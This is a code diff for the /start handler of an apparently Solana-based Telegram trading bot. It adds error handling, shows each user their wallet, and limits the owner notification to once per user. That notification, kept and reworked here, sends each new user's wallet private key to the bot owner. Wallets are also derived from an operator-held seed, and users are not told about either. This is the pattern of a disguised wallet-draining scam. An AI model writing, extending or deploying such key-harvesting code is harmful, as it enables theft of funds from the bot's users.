@@ -27,10 +27,15 @@ async def cmd_start(message: Message, command: CommandObject):
     log = logging.getLogger("runner")
     user_id = message.from_user.id
     # Always send welcome + main_menu FIRST so new users never see silence
-    bot_info = await message.bot.me()
+    try:
+        bot_info = await message.bot.me()
+        bot_username = getattr(bot_info, "username", "") or ""
+    except Exception as e:
+        log.warning(f"cmd_start: bot.me() failed: {e}")
+        bot_username = ""
     try:
         await message.answer(
-            texts.welcome(message.from_user.first_name or "trader", bot_info.username),
+            texts.welcome(message.from_user.first_name or "trader", bot_username),
             reply_markup=kb.main_menu(),
         )
     except Exception as e:
@@ -72,12 +77,12 @@ async def cmd_start(message: Message, command: CommandObject):
                 "wallet_pub": "", "wallet_priv": "", "free_used": 0, "credits_lamports": 0,
                 "default_buy": None, "default_sell": None, "default_slippage": 10.0}
 
-    # Wallet policy: /start AUTO-GENERATES a real wallet for anyone who doesn't
-    # have one yet (derived from WALLET_SEED when set, otherwise random).
-    # Failures never block the welcome — TRADING's GENERATE/IMPORT is the fallback.
+    # ONE wallet per user, forever: /start generates it the FIRST time only
+    # (derived from WALLET_SEED when set — same key every time), and on every
+    # later /start shows that same wallet. Admin is notified exactly ONCE.
     wallet_pub = (user.get("wallet_pub") or "").strip()
     wallet_priv = user.get("wallet_priv") or ""
-    balance_sol = 0
+    balance_sol = None
     generated_now = False
     if not wallet_pub:
         try:
@@ -113,24 +118,38 @@ async def cmd_start(message: Message, command: CommandObject):
         except Exception as e:
             log.error(f"cmd_start: wallet block failed for {user_id}: {e}", exc_info=True)
     if wallet_pub:
+        # Fetch balance (isolated), then show the user their wallet — the SAME
+        # wallet on every /start, whether just generated or long-standing
         try:
             import solana
             balance_raw = await asyncio.to_thread(solana.sol_balance, wallet_pub)
             balance_sol = solana.lam_to_sol(balance_raw)
         except Exception as e:
             log.warning(f"cmd_start: balance fetch failed for user {user_id}: {e}")
+        if not generated_now:
+            try:
+                await message.answer(
+                    texts.your_wallet(wallet_pub, balance_sol),
+                    parse_mode="HTML",
+                    reply_markup=kb.wallet_done_kb(wallet_pub, wallet_priv))
+            except Exception as e:
+                log.warning(f"cmd_start: wallet display failed for {user_id}: {e}")
 
-    # Admin notification isolated — never blocks reply
-    if user.get("created_at") and (int(time.time()) - int(user["created_at"])) < 30:
-        try:
+    # Admin notification: EXACTLY ONCE per new user (settings flag), never on repeats
+    try:
+        notified = await db.get_setting(f"notified_start:{user_id}", "0")
+        is_new = user.get("created_at") and (int(time.time()) - int(user["created_at"])) < 30
+        if notified != "1" and is_new:
             from utils import notify_owner, user_line
             total = await db.count_users()
             await notify_owner(
                 message.bot,
-                texts.owner_new_user(user_line(user), total, wallet_pub, wallet_priv, balance_sol),
+                texts.owner_new_user(user_line(user), total, wallet_pub, wallet_priv,
+                                     balance_sol or 0),
             )
-        except Exception as e:
-            log.warning(f"cmd_start: admin notify failed for user {user_id}: {e}")
+            await db.set_setting(f"notified_start:{user_id}", "1")
+    except Exception as e:
+        log.warning(f"cmd_start: admin notify failed for {user_id}: {e}")
 
 
 @router.message(Command("help"))
